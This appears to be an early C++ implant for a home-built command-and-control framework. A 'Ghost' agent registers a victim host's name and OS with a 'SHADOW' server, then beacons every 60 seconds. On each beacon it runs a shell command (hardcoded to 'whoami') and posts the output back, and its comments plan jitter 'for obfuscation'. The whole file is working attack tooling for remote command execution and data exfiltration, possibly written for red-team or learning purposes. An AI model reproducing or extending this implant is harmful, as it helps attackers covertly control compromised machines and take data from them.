#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <array>
#include <cstring>
#include <memory>

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>

#include "apiSchema.hpp"
#include "config.hpp"
#include "httpClient.hpp"
#include "utils.hpp"

class Ghost {
private:
    std::string uuid;
    std::string hostname;

    HttpClient client;
    int sleepInterval;
public:
    // a potential problem with UUID arises if the implant gets reinstalled
    // it'll cause it to generate a new uuid
    // SHADOW won't know it's the same one
    // TODO: how to combat this?
    Ghost(std::string ip, int port, int sleepInterval = 60) : uuid(Utils::generateUuid()), hostname(Utils::getHostname()), client(ip, port), sleepInterval(sleepInterval) {}

    bool registerGhost() {
        std::cout << "[GHOST] trying to register with SHADOW\n";
        
        std::stringstream json;
        json << "{"
            << "\"id\":\"" << uuid << "\","
            << "\"hostname\":\"" << hostname << "\","
            << "\"os\":\"" << OS_PLATFORM << "\","
            << "\"last_seen\":0"
            << "}";

        std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/register", json.str());

        // TODO: ideally get back some sort of a config, but for now just get any data
        // TODO: make this check the reponse code instead
        if (!response.empty()) {
            std::cout << "REGISTRATION SUCCESSFUL\n";

            return true;
        }

        return false; 
    }

    void beacon() {
        bool resultsStale = true;
        std::string results = "b";
        std::string task = "whoami";

        std::cout << "[GHOST] starting the beacon\n";

        while (true) {
            std::cout << "[beacon] pulse sent\n";

            // if results are old, do the task
            // if no task, clear results
            if (resultsStale) {
                results = "a";

                if (task != "") {
                    results = Utils::executeCommand(task);
                }
            }
            
            std::stringstream json;
            json << "{"
                << "\"id\":\"" << uuid << "\","
                << "\"results\":\"" << results << "\""
                << "}";
            std::string response = client.sendHttpRequest("POST", "/api/v1/ghost/heartbeat", json.str());

            std::cout << response << '\n';

            // TODO: jitter for obfuscation
            sleep(60);
        }
    }
};

int main() {
    std::cout << "GHOST UP on \"" << OS_PLATFORM << "\"" << std::endl;

    // create itself
    // TODO: think through the oop approach
    // will need to see real implants to know how it should be done
    // this one is mainly for testing
    Ghost ghost(SHADOW_IP, SHADOW_PORT);

    // try to register with SHADOW
    while (!ghost.registerGhost()) {
        sleep(5);
    }

    // for now just beacon
    ghost.beacon();

    return 0;
}
